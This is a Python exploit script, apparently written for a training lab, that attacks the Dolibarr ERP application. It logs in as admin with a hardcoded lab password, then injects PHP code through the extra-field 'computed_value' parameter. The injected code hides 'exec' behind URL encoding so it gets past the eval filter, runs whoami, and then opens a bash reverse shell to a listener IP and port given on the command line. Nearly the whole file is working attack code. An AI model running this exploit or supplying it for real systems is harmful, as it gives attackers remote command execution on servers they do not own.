#!/usr/bin/env python3

import requests
import argparse
import traceback
from http.cookies import SimpleCookie
from bs4 import BeautifulSoup

"""
Usage:
python3 rce_script.py 192.168.45.203 1337
"""

def login(lhost, lport):
    """
    Grab session cookie and CSRF token, log in, and return updated cookies and token.
    """
    try:
        # Step 1: Get initial CSRF token and cookie
        print("[*] Getting initial session and CSRF token...")
        initial_res = requests.get("http://dolibarr:80/dolibarr/")

        set_cookie_header = initial_res.headers.get('Set-Cookie')
        cookie = SimpleCookie()
        cookie.load(set_cookie_header)
        first_cookie_key = next(iter(cookie))
        cookie_name = first_cookie_key
        cookie_value = cookie[first_cookie_key].value
        cookies = {cookie_name: cookie_value}

        soup = BeautifulSoup(initial_res.text, "html.parser")
        csrf_token = soup.find("meta", {"name": "anti-csrf-newtoken"})["content"]

        # Step 2: Send login request
        print("[*] Logging in...")
        login_url = "http://dolibarr:80/dolibarr/index.php?mainmenu=home"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "http://dolibarr"
        }
        data = {
            "token": csrf_token,
            "actionlogin": "login",
            "loginfunction": "loginfunction",
            "username": "admin",
            "password": "studentlab",
            "backtopage": '',
            "tz": "-5",
            "tz_string": "America/New_York",
            "dst_observed": "1",
            "dst_first": "2025-03-9T01:59:00Z",
            "dst_second": "2025-11-2T01:59:00Z",
            "screenwidth": "1632",
            "screenheight": "815"
        }

        login_res = requests.post(login_url, headers=headers, cookies=cookies, data=data)
        print("[+] Logged in successfully.")

        # Get new CSRF token after login
        soup = BeautifulSoup(login_res.text, "html.parser")
        csrf_token_after = soup.find("meta", {"name": "anti-csrf-newtoken"})["content"]
        return cookies, csrf_token_after

    except Exception as e:
        print("[-] Error during login:", e)
        traceback.print_exc()
        return None, None


def rce(lhost, lport, cookies, csrf_token):
    """
    Send command injection payload via vulnerable computed_value.
    """
    try:
        cookie_name, cookie_value = list(cookies.items())[0]

        # Step 1: Add new extra field with simple command (whoami)
        print("[*] Sending initial command injection payload (whoami)...")
        add_url = "http://dolibarr:80/dolibarr/user/admin/user_extrafields.php"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "http://dolibarr"
        }
        add_data = {
            "token": csrf_token,
            "action": "add",
            "label": "test",
            "attrname": "test",
            "type": "varchar",
            "size": "255",
            "param": '',
            "pos": "100",
            "langfile": '',
            "computed_value": "get_defined_functions()[\"internal\"][array_search(urldecode(\"%65%78%65%63\"), get_defined_functions()[\"internal\"])](\"whoami\");",
            "default_value": '',
            "alwayseditable": "on",
            "list": "1",
            "printable": '',
            "totalizable": "on",
            "css": '',
            "cssview": '',
            "csslist": '',
            "help": '',
            "button": "Save"
        }
        res1 = requests.post(add_url, headers=headers, cookies=cookies, data=add_data)
        print("[+] Initial payload sent.")

        # Step 2: Extract updated CSRF token
        soup = BeautifulSoup(res1.text, "html.parser")
        updated_token = soup.find("meta", {"name": "anti-csrf-newtoken"})["content"]

        # Step 3: Send RCE payload with reverse shell
        print("[*] Sending reverse shell payload. Check your listener.")
        rce_url = "http://dolibarr:80/dolibarr/user/admin/user_extrafields.php?attrname=test"
        rce_headers = {
            "Referer": f"http://dolibarr/dolibarr/user/admin/user_extrafields.php?action=edit&token={cookie_value}&attrname=test",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "http://dolibarr"
        }
        rce_data = {
            "token": updated_token,
            "attrname": "test",
            "action": "update",
            "rowid": '',
            "enabled": "1",
            "label": "test",
            "type": "varchar",
            "size": "255",
            "param": '',
            "pos": "100",
            "langfile": '',
            "computed_value": f"get_defined_functions()['internal'][array_search(urldecode(\"%65%78%65%63\"), get_defined_functions()['internal'])](\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");",
            "default_value": '',
            "alwayseditable": "on",
            "list": "1",
            "printable": "0",
            "totalizable": "on",
            "css": '',
            "cssview": '',
            "csslist": '',
            "help": '',
            "button": "Save"
        }
        res2 = requests.post(rce_url, headers=rce_headers, cookies=cookies, data=rce_data)
        print("[+] RCE payload sent.")

    except Exception as e:
        print("[-] Error during RCE:", e)
        traceback.print_exc()


def main():
    parser = argparse.ArgumentParser(description="Dolibarr Eval Filter Bypass RCE")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    cookies, csrf_token = login(args.lhost, args.lport)
    if cookies and csrf_token:
        rce(args.lhost, args.lport, cookies, csrf_token)
    else:
        print("[-] Login failed. Aborting.")


if __name__ == "__main__":
    main()
